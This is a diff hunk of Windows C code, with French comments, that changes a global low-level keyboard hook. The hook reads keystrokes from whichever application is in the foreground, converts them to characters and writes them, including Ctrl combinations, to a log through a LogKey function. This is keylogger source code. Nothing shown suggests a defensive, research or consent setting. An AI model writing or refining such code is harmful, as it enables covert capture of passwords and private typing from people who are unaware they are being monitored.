@@ -88,24 +88,24 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         // récup de la locale du process au premier plan
         HKL keyboardLayout = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
 
-        // essayer de récupérer le caractère correspondant
+        // essayer de récupérer le caractère correspondant (sera utilisé si pas Ctrl)
         WCHAR unicodeBuffer[8] = {0};
         int result = ToUnicodeEx(vkCode, pKeyboard->scanCode, keyboardState, unicodeBuffer, 7, 0, keyboardLayout);
 
-        int ctrlDown = (keyboardState[VK_CONTROL] & 0x80) ? 1 : 0;
+        int ctrlDown = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 1 : 0;
         if (ctrlDown) {
-            // si ToUnicodeEx a renvoyé un caractère, l'utiliser pour logger le combo
-            if (result > 0) {
-                if (result < 7) unicodeBuffer[result] = L'\0';
-                char utf8Buffer[32] = {0};
-                WideCharToMultiByte(CP_UTF8, 0, unicodeBuffer, -1, utf8Buffer, sizeof(utf8Buffer), NULL, NULL);
-                char comboBuf[64];
-                snprintf(comboBuf, sizeof(comboBuf), " [CTRL+%s] ", utf8Buffer);
-                LogKey(comboBuf);
+            // si la touche est une lettre ou un chiffre, afficher directement le VK
+            if ((vkCode >= 'A' && vkCode <= 'Z') || (vkCode >= '0' && vkCode <= '9')) {
+                char comboBuf[8];
+                // utiliser la lettre majuscule pour l'affichage
+                comboBuf[0] = (char)vkCode;
+                comboBuf[1] = '\0';
+                char out[16];
+                snprintf(out, sizeof(out), " [CTRL+%s] ", comboBuf);
+                LogKey(out);
                 return CallNextHookEx(NULL, nCode, wParam, lParam);
             }
-
-            // essayer d'obtenir un nom lisible via GetKeyNameTextA (fallback quand ToUnicodeEx ne renvoie rien)
+            // essayer d'obtenir un nom lisible via GetKeyNameTextA (fallback)
             CHAR keyName[64] = {0};
             LONG lParamForName = (pKeyboard->scanCode << 16);
             if (pKeyboard->flags & LLKHF_EXTENDED) lParamForName |= 1<<24;
